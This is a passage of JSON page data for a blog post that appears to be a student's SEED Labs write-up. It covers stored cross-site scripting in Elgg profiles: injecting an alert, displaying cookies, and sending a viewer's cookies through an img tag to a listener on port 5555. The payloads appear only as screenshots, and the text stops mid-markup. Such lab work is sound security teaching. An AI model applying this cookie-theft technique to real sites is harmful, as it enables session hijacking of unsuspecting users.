{"componentChunkName":"component---src-templates-blog-post-js","path":"/SEEDlabs/XSS/","result":{"data":{"site":{"siteMetadata":{"title":"KunheeKim.Dev","author":"[Kunhee Kim]","siteUrl":"https://kunheekimkr.github.io","comment":{"disqusShortName":"","utterances":"kunheekimkr/kunheekimkr.github.io"},"sponsor":{"buyMeACoffeeId":""}}},"markdownRemark":{"id":"f60b9dd1-24ef-59bc-adb6-6b1a22298add","excerpt":"Lab Instructions Task 1: Posting a Malicious Message to Display an Alert Window The objective of this task is to embed a JavaScript program in an  profile, such that when another user views your profile, the JavaScript program will be executed and an alert window will be…","html":"<p><a href=\"https://seedsecuritylabs.org/Labs_16.04/PDF/Web_XSS_Elgg.pdf\">Lab Instructions</a></p>\n<h2 id=\"task-1-posting-a-malicious-message-to-display-an-alert-window\" style=\"position:relative;\"><a href=\"#task-1-posting-a-malicious-message-to-display-an-alert-window\" aria-label=\"task 1 posting a malicious message to display an alert window permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Task 1: Posting a Malicious Message to Display an Alert Window</h2>\n<p>The objective of this task is to embed a JavaScript program in an <code class=\"language-text\">Elgg</code> profile, such that when another user views your profile, the JavaScript program will be executed and an alert window will be displayed.</p>\n<p>Log in to Sammy’s account and Edit the profile as following using HTML. The following code is an JavaScript program that displays an alert window ‘XSS’.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto;  max-width: 697px;\"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 102.33333333333334%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAACXBIWXMAAA7DAAAOwwHHb6hkAAADaklEQVQ4y5VUa08UVxiev9OEtivaQtB2hdSkZsHEW3bKZSEgajAGZDcpeDfGQEzapqW0FjWgcjFCTYSm0X7oF2Pih5ZoSL0suzC7O7dddnaue4FdePrOLFhNCchJnrznzDznOe95L4ep/v4p3Nd57BoQ8fkNERUDAs0FVPwiwE3r0p8luH6S38HH/RJKfuDx0Y8CXP0idlyTsJ14ZdcEMMP3JnBzaBC3RsZwa3QMt8fuYvDOSHE+ehcTD6YwOj6BkXvjhKIdfzCJPx8/wdTDP/Dr5G/O+v7kFO7//ghMS3sv2KYu7PPsRe2harAHq+E94IF3vwc+dj9qvqxElbscO8u3EUodW+Uuw57Knagoc+HT7R/ik9IS7HB9gC/2VILx+W+jOTCM6b+eQeLCiISCEOZDiM3NIq0pGLo5gPo6Fk2N9fD56hw0NNSCZQ+jttaLr1Yt6z2IlqOtYAIX+nH6Yh+ez7yGrquQZRmariGVSkGSJHAch2g0gkQiASWZpO8KNE3D0uIi0paFeFyGStxkIg5RjoM53tmLE6cu4+/pGfBRDtz8PGLRKESBdyDLEgQ+hjgdlKDNpmmQkIl02nIE15DNWFhIaWAajnSg9dhJvApyjkA4HIYgithorKys/A/2UDWdktIUwNF6EgxxmJ0NIhKJQKEr2KRCoYDl5eVNYfMcQbo201jjQ91nHvCJFHLZrENYO3HVnXU9WtfDhAym4+senD7bg39ehhAMvqYERGFRTNaQy+WwSAnYCKqZgWrloCgpMO1dVxHo7kVoLuZkjBcEiHRtSSQriU62VVXdEDbHzryimWBcx79BSVsfohHByZxGgdX1/2ATN4MtahBX0QwwbFMnvG0B8DEBBpXEeh5sSXCorh7D/gNUlBJ5ZGxJaF3Bbv8VXO2+glBERCaTplrS3ohtFru3oetaUbClsQvH2i6Bi8lIKUkYhkGZzTodkc/n39TZZrDLK6VbYM713kDPt4N48TJMcaSWoy6RqYdN08T7jrWyVQ0SdNecxG7PCcxxPEzyLrGQpPKJI0+n2gX7fp2ybMsWPTzcfBZs8xnMRySn6bOZDAp01QxZm/x279qbNhqOh/7zffCf+Y4ERSzYT5SirNYgPVFLSxTHghNLG2Y2Dyu3hGyOnq5sDrq1CCNTnNv/k6qBfwG3AWcpqpe2iQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"1-1\"\n        title=\"1-1\"\n        src=\"/static/353b229e88d67dd80c7e8a890838d95d/7422e/1.png\"\n        srcset=\"/static/353b229e88d67dd80c7e8a890838d95d/5a46d/1.png 300w,\n/static/353b229e88d67dd80c7e8a890838d95d/0a47e/1.png 600w,\n/static/353b229e88d67dd80c7e8a890838d95d/7422e/1.png 697w\"\n        sizes=\"(max-width: 697px) 100vw, 697px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n    </span></p>\n<p>Log out of Samy’s account and Log in to Alice’s account. Try viewing Samy’s Profile using Alice’s account.</p>\n<p>When Alice clicks on Samy’s Profile, an alert window ‘XSS’ shows.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto;  max-width: 698px;\"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 102%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAEjUlEQVQ4y4WU61NTRxiH82f0e5lp/cBFMUJJA8QOIgIiKBIIlxiEeKFRQYGAgFwlkHsCSUAhQABRRGtbdew4pV+0rU4dO7VOq9KLd51xpIKNgH26OY2tdjrTM/PM7909u7/zvrt7VrbecYGkvtso+u6h7L9HvPcuCb47xHvuoBp4gLzvETGehyz3CsIa0/uASPddonruiz4xxvdQItZ7H1lg4hi+/n4GhocZHh0VOsKgwB8Y5ZDfL7VHxsclAuNHJD06NcX56S84dfo0kydOMnF8SugJJk99ikxn6GRziZHszAyKNmeizl6HZlMmBTnpaPOzWaNSkKiQEy+PEkQTtzJKtFeSrIxDHhvJiphlLI9eRkzkOygTFci0e4fQ7RvlmyvXeHDnZ27/NMOvM7e4d/sXgnPPCAwNUlysQacrYYu2WFAkUajJp6iwAI1GTVGR0II8SsvLkBlbfTS09vLd9VssLASZnZ0lGAwSfPGCpyJ+9PgxT5484fnz51L/0tISrz+h/hdibPD3eZ4+m0dWZmhFX9GIy+VlYmyEscAwYyNiPQcPS4Qy9A8cIjDsZ1QwNXmUk8eP/cPUJB+fPMFHQs+cOYussHQX6gItcalqkrM0JAkU6XkkrAuxWUIhkSuRkLbpb+JTN0ooM9Ri/kbytNuRVejrKczZSprBTEmDA02dnTyjE3WtnQ2V3eRWdbFGvFN9aGF1CEMYEafvc5FR3UOG0NS9bsqbXKLk3DI2yD9Ata2dzF2dpBsOklbRQV61mQOeIzR7xqnvOUJdz4SEMawh1ldZSKnoZK2hi9U7TeiMZmQ1Dd3s2dtI/KZdZG7bT2qpEUVBJTsOOPi/R1vTiSJ/NylbqlEWVlGyuwnZ7joL2/c0U2Vspbapjcq6ZvbUNNLt6JUmLb18yR9C5+bmBPNS/DLUJwK3t58D7Sbau6y0mSx0CpXFGZxElNloEmbJGflEKtKJVqRRrK+UDBcWFlhcXJSOy7/xiz/JbrPjdrnFKXHhsDuRbS3fh7p8J42NrSjW5hIjzCKik8gp3PZXhkuL0jl7xbzI9NlvsyyI+NDhAcwWG3aHS+DEZnMg85foGNixjpb2DlapsohOSEWenIVKHJ2zn33OufPTXL36bZirXL58mUuXLkmx19eHVWToeN2wwdhNR3ULtY0dvJ+SxbsrEolLziRqlYqIKCXvrc4SWVgwdXXT1W0WWOg2W6TYZndIRq+whUrWl+5nS2kdtQ1trEpO5623o4iVJxEbn0JEjJJsjR63uweH04XT6Q4jYrFur5vZHQ5szl5kzWY/raY+autb0JZXsD63iLxiPbkFOnLydegNNZLZm5P/C2HoEoYpG6tYkVhCc1uXWAMrnSYTdrsdr9eLx+MR2bnfKC1k/gp7GKkdKtnlEddXRTu5xdXUN7RjEmbNLa0SHQc7hbEjbOKUynSID1mtVoFNwmYThGOLxYrZJtbQ2Oajqt4mdnRa3IlX+Frs4IULF7n45Vdc+/46N27e5IcfbzAzM8Mn56bxDQYYHBkTN/ko3sNj+IZCt3yA4ZFRhsaO8icFoi6p+6GUGAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"1-2\"\n        title=\"1-2\"\n        src=\"/static/dc94ae4a2bc53852aeb1826b447926af/487bb/2.png\"\n        srcset=\"/static/dc94ae4a2bc53852aeb1826b447926af/5a46d/2.png 300w,\n/static/dc94ae4a2bc53852aeb1826b447926af/0a47e/2.png 600w,\n/static/dc94ae4a2bc53852aeb1826b447926af/487bb/2.png 698w\"\n        sizes=\"(max-width: 698px) 100vw, 698px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n    </span></p>\n<p>This is because when a user tries to view Samy’s profile, the JavaScript code in the profile is executed.</p>\n<h2 id=\"task-2-posting-a-malicious-message-to-display-cookies\" style=\"position:relative;\"><a href=\"#task-2-posting-a-malicious-message-to-display-cookies\" aria-label=\"task 2 posting a malicious message to display cookies permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Task 2: Posting a Malicious Message to Display Cookies</h2>\n<p>The objective of this task is to embed a JavaScript program in an <code class=\"language-text\">Elgg</code> profile, such that when another user views your profile, the user’s cookies will be displayed in the alert window.</p>\n<p>Log in to Sammy’s account and Edit the profile as following using HTML. The following code is an JavaScript program that displays the user’s cookies in the alert window.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto;  max-width: 698px;\"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 102%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAACXBIWXMAAA7DAAAOwwHHb6hkAAADhUlEQVQ4y52U/U9bZRTH758zTcaq8qIZQzd1aqYu0WxmKxUYlpeR4fxhw2x0yTRuGubMxlsHTJjMgAtbSJzuJSYuMhYymQrUgRvQdkJoC3257b0tbWk/PvehNEFZRE/yybnPc8/53ud8e2+VnWdus7VjhufPe3mh00tBm4fCDi9bOjy82OUjv82HqdXLU3ZBJptaPWxsmiWneQ5Ti4e8c15Jrt2Dcrnna1pam2m022myn+OzRjunm1o427LMl93ddPf0SC729Mp86coVfrh1i2+/v0Zff79cG7n/6lWUygOfsMtSx2vbX2L3zu3senOZt19/mT1v7eCVbZvZsjmX5/I38WzeJgpycygS661FBeQ9s5GnTU8InsSUs4GiwnyUskNfUX64h8E7v+Cb/RPX9DSzj9zMuF1oaoheMUFJiYV95aWUlZVISkvfpdiyF4vFjLk4k817sFrLUepPtGP7uJmR3xwkY2FUv5e4Hpaofh8LczMEfHNEw0HimipqIqTiOpCGVIKY2E9GRb0WlDXKewc+oqr2OA3dN+n98Vc6r92l68Yw578bouv6z9nrCzfuceHmPS4N3KdvcCLLZYM7E3wzMM6Aw4Vi3ldLcYkV8+fXOdI3wv7OIaoFFR2Dq2m/LbG2GQysoqJ9AEvrTzT2D6HUVNVTvbeGB5MuYmLMSChARHj3f2JJXUCxvlOFpWgHwyPjPHz4gLGxMZwuN2nDolRKkF4HKcNRokEheNjWQL3tBKO/T+L3LxAKqUSjUVm0tLSUZVl8bdICI6K6hvLB0dMcrDuJY3wKNRREF2L/NeLJFDGB0asUHjzLhppmRkfHcU5PMTk1hdfrZX5+Hp/PlyUcFv5GImsSEFP5Q+K+Jk5YWfUhxfvfZ3LSKZsMIUPQEFnJBoFAgGAw+FjCqirFlc6yCi7WvoHT7UTTdOFhCFXc/DvG/uMwBNUVQduRUzQcFR7+4ULXxfEDq5+80rBuweoKG9bKYzgmnPJX+rfR1sLoMYSl4PFTnXz6RReO+1PoWkQUhKSXBpoweb3oui6z8uruQ+RvKxdfyiP88z75pMXFmDQ5lXm/ViKdIbtOZ/bSy7vG+6uUiv9Ds9XG3WEHC0LQ7XbjdIrPMBbLNKWzrJb7Zxg9iu1kO3XHzsgTxsXJVDluhHg8TjKZJJFIkBDZuFajCUEcLRqT+NVFApqYRo+K3kXp4V/hRElF9UAH7QAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"2-1\"\n        title=\"2-1\"\n        src=\"/static/061b0d717bdf2abb1bd4b295dde99e7e/487bb/1.png\"\n        srcset=\"/static/061b0d717bdf2abb1bd4b295dde99e7e/5a46d/1.png 300w,\n/static/061b0d717bdf2abb1bd4b295dde99e7e/0a47e/1.png 600w,\n/static/061b0d717bdf2abb1bd4b295dde99e7e/487bb/1.png 698w\"\n        sizes=\"(max-width: 698px) 100vw, 698px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n    </span></p>\n<p>Log out of Samy’s account and Log in to Alice’s account. Try viewing Samy’s Profile using Alice’s account.</p>\n<p>When Alice clicks on Samy’s Profile, an alert window with Alice’s Cookies shows.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto;  max-width: 698px;\"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 101.66666666666666%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAEkklEQVQ4y22U/U9TVxjH75+xn/bDNqeiDnEDCoIWI28iqBBEwBfKW7EguK1KBUGEWqC9fS8IBYEiFXSCzmRL3Gay7IeFqLAtU6M4RpY4R7AFJVmgzuyz0xt1OneTT77nOfecb855nudeaXfXDdIHZ0k5GyB9KMhWX4CUwYCiGf4gCf1BYnsDqF4htucRH3XNEuOdE/EjEvoCJArie+eQRnwDOB12ZLsVm9AwFquMxSYr6u310u/rVxgI60AfI+eH+errq4xdHlPG/uFzip4fHUMqrWolu9DAjox0CnO2sWdXOvmCPTvT0eTvIiVpI6qY9XwYFcGG9WsEESKOJC42ish1q1gbsYI1q98jYtU7qOJikIr0Poo+HeSnn6cIzv3Bw98f8PDBA+ZmZ3m6vMTIsJ8KbSlVlRVU6irQ6bSKasWctryUsrJi8b6MslINVTU1SHXGbppMXdy68wuh0BKPHy+wvLzM0tIS8/MLPAoEWFhYUOLl5RD/fcJrnz37i6ehZRb/XEIqqzFSerAeWXYycMbLmR4vvd4uujs9eE930NN1mtMel6JhhkTO/YM+gdCzPs4JRs4NMSz00qVL4spaPTm79xKbvhd19n7BATZmFpKQtZeEzALitxeIuEAZK3HGnpfEbcsT+3aTmFVITHoeeRodUrW2jqLsMtJqZIoaXBTWOck75iZHL7PjEwu5ejMp1TJJh2xsOWRlS7VNIUmMkw87yKztIPOohzR9B+UnPEglueXsVKWiLjeSUd1KWpWJbYLjHj+y73Ms/WO09l3m1CsYz1ymbeAKR5x+kitbSa1qI0nXhsZgEUVpsnGkton43Bp26RpIKz1GWomBe9O/PU/738/hjfjO1K9sPaAnWXMU9T49mo9PIFXo2ymuauRovRFDYws1tY3UNjRz9+49niwuigo/JhAIsiAqHggGCQrC8ZMni0zdn8ZkttFqsQtsmGU7UqTWzPsVThqFWaJI8sqYFKLVWdy6fVc5RSgUEm3x7A3Cz8zMDE6nE5fbjVvgcDiRKsv1FFXoaDwhDEXFPohLJSo+TTT6bWVTuMfCpi8I9938fFD0XYjp6WlsdgcOp0vBbheGvfuK8WrTaD5lIjYpi3WqFBJSc5FdXVz54qrCxOQkExMTgklu3pxgfHxcGX9z7Rp2carXDBvqrZgMJpG3UyQk72TlhkRi1dtZsVbF26tVRG/eTrvZQmtb+0va2s2Kms3ySzPF0OFCKi+pp6j4GIYGIzHqDN56N5IN0ZuJjk9lRdQmsvdV4OnoEHny/C//GjqxuzqRWmw+jJYeDPXNlBysJidfQ2Gxjvz95eQJdIcNIvGu107yJm5ljd0tDNU7DrNWVUCLSRaTDswWCy6XC6/XS3d3N52dnThdbjHnVtQR5pUr2l+ow4HN1YGkqTaJb9CAXjR3i9HI8YZG6o830HSyWZjLChbZqmC1WkXi7Yp5uFU8z9vFLa4extnRhdRs6aPupIu+AT/Dw8P4fIOcHfJz4cJnXBR/4IujowqjY2P0+S9w8cqX3Jz8kRuC777/gW/Hr3NdVPz+1D2mpmf4B040NkZzeFhCAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"2-2\"\n        title=\"2-2\"\n        src=\"/static/cef28ab348691d5de90e6244160508a6/487bb/2.png\"\n        srcset=\"/static/cef28ab348691d5de90e6244160508a6/5a46d/2.png 300w,\n/static/cef28ab348691d5de90e6244160508a6/0a47e/2.png 600w,\n/static/cef28ab348691d5de90e6244160508a6/487bb/2.png 698w\"\n        sizes=\"(max-width: 698px) 100vw, 698px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n    </span></p>\n<p>This is because when a user tries to view Samy’s profile, the JavaScript code in the profile is executed.</p>\n<h2 id=\"task-3-stealing-cookies-from-the-victims-machine\" style=\"position:relative;\"><a href=\"#task-3-stealing-cookies-from-the-victims-machine\" aria-label=\"task 3 stealing cookies from the victims machine permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Task 3: Stealing Cookies from the Victim’s Machine</h2>\n<p>In the previous task, the JavaScript code in Samy’s profile printed out the user’s cookies in an alert window, so the attacker could not see it. The purpose of this task is to modify the JavaScript code to send the cookies to the attacker.</p>\n<p>Log in to Sammy’s account and Edit the profile as following using HTML.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto;  max-width: 865px;\"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 82.33333333333334%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACvUlEQVQ4y53SaU8TQRwG8P0OfgU/gUGBRAKEF5po1KgJHkFFX5iYqIFCyxbKIQgGDUYF481RoLXcCYcmKDEaSEpLwQYplKPl6LW9ty0t2/ZxdkuBF7wANvnlmZmdzPxnZylZ9XNIaRqSokeQigsgFj1ESdFjlEuLUVVBo5QWoUxaBBnpS0sKQUsKQJN5pSUivGp4hrqnFSgvkwieVEhBncl7CbGsCUr5J8ibE/pUnWRyPXJyspCdnYHMzNPIyspAevoppKam7OD7SWlpJ4Wkbj54AVXPDwAxcJsBIM4JPIwNet0kjHN6rCz8g3nRANu6CY4NMxjLLot5CYtkzuqSQUgq764IhTXv8XZIgzf9E2gcmMDrvnG8G1Tjw8gUPn7ToXlUD8WfBXT8nkcnybZf8wK5kAa0js2hheidMIK6cOkW8ulG1A4ZUN07jZq+GVT26FA38JfklNAu79KiqnsKMpUGlaRNK9R7TEKqnISkU436AR35hifOorXxC1jWC+uaGX6vG0d/YqCu5d5Hu7wLNrsdJhNZkGURj8cRjUaJ2IHF4zFEIhFQF/NptCgHwfr9pEr2aHWRAiJcDOHIFqhjl6WobR2Gy27F8ooJDMPA4XCAIRXz6XQ6hbFkCu9IJsd4fj8Ll8eHQDAISnzuPEb7PyMUjsLlchKuRDoYuJzJPuFOpHPv2DaPxwMvEQwEQImu3sFwdxeC4Qjcbje8Xm+Cz7fbPgCPx4sgX2HujWK0f/2Ozc3Qzm48fvHDCvAVXrldig7VCLmhsLATfzl+gn95WKFQCNTxlOtoaFIgyPpgJxfhJ0flr/8oD8dx5Mj3ytCmGCTHdGN1dQ0Wq3X734ruiyO2OB6XsMWRX4YTFguHw6C0s0swmjZgYTywONyCNRuzr3VieYOBSmtFr2YWY9PzUP40ol2twbh2BnqDEf8BE4NKTSbAJcsAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"3-1\"\n        title=\"3-1\"\n        src=\"/static/a383011b57cc16a6c90e21809a1b830b/79e48/1.png\"\n        srcset=\"/static/a383011b57cc16a6c90e21809a1b830b/5a46d/1.png 300w,\n/static/a383011b57cc16a6c90e21809a1b830b/0a47e/1.png 600w,\n/static/a383011b57cc16a6c90e21809a1b830b/79e48/1.png 865w\"\n        sizes=\"(max-width: 865px) 100vw, 865px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n    </span></p>\n<p>The code is an JavaScript program that has an <img> tag with its src attribute set to localhost. When the code is executed, the browser will try to load the image from the link in the src field, and a HTTP GET request will be sent. The data of the user’s cookies will be sent, and the attacker will be able to get the information by using a TCP Server listening to port 5555.</p>\n<p>Start a listening TCP connection using the command below.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto;  max-width: 870px;\"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 82.33333333333334%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACwElEQVQ4y3WSbU/TYBSG+0/8Df4DEz8rok6DxmhAIZiIUaMBQTI2UIgCOgaobLBNGEYUY4IiKrAXWLd2W9t1L13Xdv6T2/OUdaCOD1dOtyfneu5zWq57ScSliIUrERMdYQOXl2q4GqEaMtG2aOEcweqZgGlzlmgLUg2yatm00/mFJQuucB2c5+kkhrzjuP9q3ubeyzncnZrFI/8Cht6G8Pj1IgYJTyBEhDHc+I+dzXzZxHj0I9yLy8QKvOH34Npv+tHTPwv3UhTuyCeMLq/DHVrDxIcNTK1vwbv8GS/WviL4PYaFzRjebCURTuTwLplHlFearKYLWKXK9Tycw7DHj1/fNhD/+QOp2A72d7fBx3eRTsSwt7ONzF4CfCKOdDIOYT+JspxHRZGhqQr0okoU7ForFcFd7+7H2IQffCaDtIMgIEPYVRQbv0UI9Cxms0QOubyEvCRBkhXISgFKgaGCO+/qgndsGgI1pFIp8Hwa6XRrMnSZQPIsSSUmI2RZhqIoUFXVhrtzuh0zAyPI0CFPwuNEDkyYy+WaogIlYxwKO/vge+6jsURKl2opYhKnijQ2E7J0TOhImaxYpB1e7B3B6HQAIjWkUvyxYx6V5fP5luOWSiVwJ664cftZAHJWwD4JeZ7/Lx0TtZIdTcZklUqFPmyXC9E5D0SpCFHINJsZbPlM4oiYxBnVETHK5TI0TYNWpoQD13oR9PmRlej1N25mTUzw72iOyEnDYKJqtUrosCq0wxtdTzDpi1CT1LydjXJ04a1GO5Acous6TF0D13HLTcIQlEayw89BbUqcykZjVCgVE9RqNRvDMGCaJkzLAnfyVBceDE7RzSqN+Pd+WJpSo9qixpi6XiWRboss00CdRPV63Ybr7BuDb37F3kWxyBpZk2anYHup6gfoLA0JajUD5aoBjapuWFRNVI2DdPX6b/wBNEULyNF9dO0AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"3-2\"\n        title=\"3-2\"\n        src=\"/static/d9a0c23d5a8a2680ada35e18ae8ffc38/3f3b9/2.png\"\n        srcset=\"/static/d9a0c23d5a8a2680ada35e18ae8ffc38/5a46d/2.png 300w,\n/static/d9a0c23d5a8a2680ada35e18ae8ffc38/0a47e/2.png 600w,\n/static/d9a0c23d5a8a2680ada35e18ae8ffc38/3f3b9/2.png 870w\"\n        sizes=\"(max-width: 870px) 100vw, 870px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n    </span></p>\n<p>Log out of Samy’s account and Log in to Alice’s account. Try viewing Samy’s Profile using Alice’s account.</p>\n<p>When Alice clicks on Samy’s Profile, Alice’s Cookies are shown in the Terminal.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto;  max-width: 869px;\"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 82%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAA7EAAAOxAGVKw4bAAADtUlEQVQ4y5WT609bdRjHzyv/A9/5Qk32xktiTJxzF4nDDGPMcCIbUGRkjIEbw7kh0LAxKy7IBsOZDSNkVXoo0HZcRsulLS2FUaAthV65jAnEOTCBGF84AwX28dczEqcmJp7kk+9zfuf3XHMeKeP6ECk/3OOwbpEPGxeEvUBGy32OtCxxUPeAZPlJlkhu+ov3m5YFSxwSpDQvkyqQyj6vQq1Wcyr/GAUf53Ay7xj5udkUFuRRpj5HafGnCuqSs5QUfUJxUSHF5wop/ewMtdWVVGjOi3tFlJUWcfFCKVKS6ipqTT1GvRZZ24B8sx5Lu5FrNVW8nZggeJP9b+0jUbB3z+vsfuO1bXaK913KWZw9u3cqKmUX1qJrtbG5GeOPhw+JxdbZ3Njgl+VlPB4PoWCQcDjM3NwcCwvz/+Lu7AzBYIDpqai4G0BKyz5Lg7aVn35+QCAyzezcPULRGWbm5lldWWF1dUVJFE+ysRH7G8pZLEZsfV3R9bU1pHfey8Ro6KSqoYPnEo6SlFnCC0l5JKpKmF+8r1S2trbO1taW6GLzP1mLB8zZlYRDNlBSK/P0ywfZsS+Tp3Yc4KUDufz62+/w6BH/55HyPzqJ6XuZ08Uann81if0fnOCZFxPY+24WnrFRFn+8y+x0hJlo+B+EnuDxeyQ4iXSk4BLp+SWkfVFNelUd6ZXXSS6/TEpFLYcvXeOQpobUiqucqL7B8eo6si7XkVF1A9WVOlTCVl35VtHMbZWeVWnILPuaxlYjNw0dyG2dNJo6MFj6aLc60HeYMfXYsDhcgkF6h9yMBCLcmQjiFhrHG53FE5lRkL5MTaX24im0om1zZwd9Fgs95i76ui0KvRazopbbt+kRtrWnG2e/HZfDwZjbjXtoCL/Xg2fELdSLpD5aQOWFcto6u7hlNNGi09EiN9Eq6BZBujtFIKG9XV309/XR399PvwjmFc4+nw//xAR+v5/x8XF8Aik7p5zyim9ou2WiSd9Me3s7Pb29OITTkMg+KLDZbDicTpwDA8q5U9huUZ3LNcDw8LBQF4ODgwyI71JarobzmloMhlaMokKTYGDb0S4CWa1WhoXzxHYlcQ0EAgSUDYoQiTwmGo0yNTWF9EpCDlnHi2nWy+hFhfXf1SPLMjrRenOzHq1Wi9ksZmftw263KwnuiKqD8aCBSWXdwqGQCC5+G7GiUs6Zr6isqccuZmN3xNtyYbPH5+RkZHRMzMWPx+tjdMyD1zeu4PFPMhEMEwiFmQxGxMpGCEdEhdMz/AmtMsgzTQ4d9wAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"3-3\"\n        title=\"3-3\"\n        src=\"/static/f764054e2e564871a5dfc863824f6ab6/2b2c6/3.png\"\n        srcset=\"/static/f764054e2e564871a5dfc863824f6ab6/5a46d/3.png 